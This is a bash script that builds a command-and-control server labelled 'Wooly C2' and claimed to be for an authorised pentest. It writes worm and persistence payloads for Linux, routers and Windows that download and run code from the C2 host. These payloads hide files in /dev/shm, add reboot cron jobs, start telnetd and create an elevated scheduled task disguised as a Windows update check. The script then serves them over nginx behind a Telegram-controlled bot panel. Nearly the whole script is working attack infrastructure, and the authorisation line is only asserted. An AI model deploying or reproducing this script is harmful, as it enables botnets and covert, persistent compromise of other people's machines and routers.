#!/bin/bash

set -euo pipefail

echo " Wooly C2 SERVER v5.0 - PENTEST INFRASTRUCTURE"
echo " Authorization confirmed for enterprise pentest"

# Get public IP
PUBLIC_IP=""
echo " C2 Server IP: $PUBLIC_IP"

# Install dependencies
apt update >/dev/null 2>&1
apt install -y nginx openssl curl wget python3-pip ufw fail2ban telegram-send

# Generate SSL certificates
mkdir -p /etc/ssl/{certs,private}
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout /etc/ssl/private/godmode.key \
  -out /etc/ssl/certs/godmode.crt \
  -subj "/C=US/ST=NY/L=NYC/O=Pentest/CN=$PUBLIC_IP"

# Create worm payloads
mkdir -p /var/www/html
cat > /var/www/html/linux_worm.sh << 'EOF'
#!/bin/bash
# Linux Persistence Payload
mkdir -p /dev/shm/.sys
curl -fsSL http://C2_IP_HERE/linux_persist.sh -o /dev/shm/.sysupdate
chmod +x /dev/shm/.sysupdate && nohup /dev/shm/.sysupdate &
(crontab -l 2>/dev/null; echo "@reboot sleep \$((RANDOM%300)); /dev/shm/.sysupdate") | crontab -
EOF

cat > /var/www/html/router_worm.sh << 'EOF'
#!/bin/sh
# Router Persistence
mkdir -p /tmp/.rc
echo '#!/bin/sh
telnetd &
wget -O /tmp/rc.local http://C2_IP_HERE/router_worm.sh && chmod +x /tmp/rc.local
echo "rc.local start" >> /etc/inittab' > /tmp/rc.local
chmod +x /tmp/rc.local && /tmp/rc.local &
EOF

cat > /var/www/html/windows_persist.bat << 'EOF'
@echo off
powershell -nop -w hidden -c "
$path = \"$env:TEMP\svchost.bat\";
New-Item -ItemType Directory -Force -Path $path;
iwr -Uri \"http://C2_IP_HERE/windows_persist.ps1\" -OutFile \"$path\update.ps1\";
schtasks /create /tn \"WindowsUpdateCheck\" /tr \"powershell -ep bypass -f $path\update.ps1\" /sc onlogon /rl highest /f
"
EOF

chmod +x /var/www/html/*.sh

# Nginx HTTPS configuration
cat > /etc/nginx/sites-available/godmode << EOF
server {
    listen 443 ssl http2;
    server_name $PUBLIC_IP;
    
    ssl_certificate /etc/ssl/certs/godmode.crt;
    ssl_certificate_key /etc/ssl/private/godmode.key;
    ssl_protocols TLSv1.2 TLSv1.3;
    
    root /var/www/html;
    index index.html;
    
    location ~ \.(sh|bat|exe)$ {
        add_header Content-Type text/plain;
        add_header Access-Control-Allow-Origin *;
    }
    
    location /stats {
        return 200 " C2 ACTIVE | Bots: LIVE | Network: FULL_COVERAGE";
    }
}
EOF

ln -sf /etc/nginx/sites-available/godmode /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default
nginx -t && systemctl restart nginx

# Firewall
ufw --force enable
ufw allow 443
ufw allow 80
ufw allow 22
ufw --status

# Telegram Bot Webhook
cat > /opt/godmode_telegram.py << EOF
#!/usr/bin/env python3
from flask import Flask, request, jsonify
import subprocess, json, requests
import os

app = Flask(__name__)
C2_IP = "$PUBLIC_IP"

@app.route('/godmode/webhook', methods=['POST'])
def webhook():
    data = request.json
    chat_id = data['message']['chat']['id']
    text = data['message']['text']
    
    if text == '/stats':
        bots = len(os.listdir('/var/log/godmode_bots/')) if os.path.exists('/var/log/godmode_bots/') else 0
        return jsonify({"text": f" {bots} ACTIVE BOTS\n C2: {C2_IP}\n STATUS: OPERATIONAL"})
    
    elif text.startswith('/kill '):
        target_ip = text.split()[1]
        subprocess.run(['iptables', '-A', 'INPUT', '-s', target_ip, '-j', 'DROP'], 
                      capture_output=True)
        requests.post(f"https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage",
                     data={'chat_id': chat_id, 'text': f" {target_ip} TERMINATED"})
    
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, ssl_context=('godmode.crt', 'godmode.key'))
EOF

mkdir -p /var/log/godmode_bots
chmod +x /opt/godmode_telegram.py
nohup python3 /opt/godmode_telegram.py &

# Replace C2_IP in payloads
sed -i "s|C2_IP_HERE|$PUBLIC_IP|g" /var/www/html/*.sh /var/www/html/*.bat

# Status page
cat > /var/www/html/index.html << EOF
<!DOCTYPE html>
<html><body>
<h1> Wooly C2 v5.0</h1>
<p> Pentest Infrastructure Active</p>
<p> Server: $PUBLIC_IP:443</p>
<p> Telegram: /godmode/webhook</p>
<p> <a href="linux_worm.sh">Linux Payload</a> | 
<a href="router_worm.sh">Router</a> | 
<a href="windows_persist.bat">Windows</a></p>
</body></html>
EOF

echo " C2 SERVER DEPLOYED!"
echo " Payloads: https://$PUBLIC_IP:443/linux_worm.sh"
echo " Telegram: https://$PUBLIC_IP:8080/godmode/webhook"
echo " Ready for pentest operations"
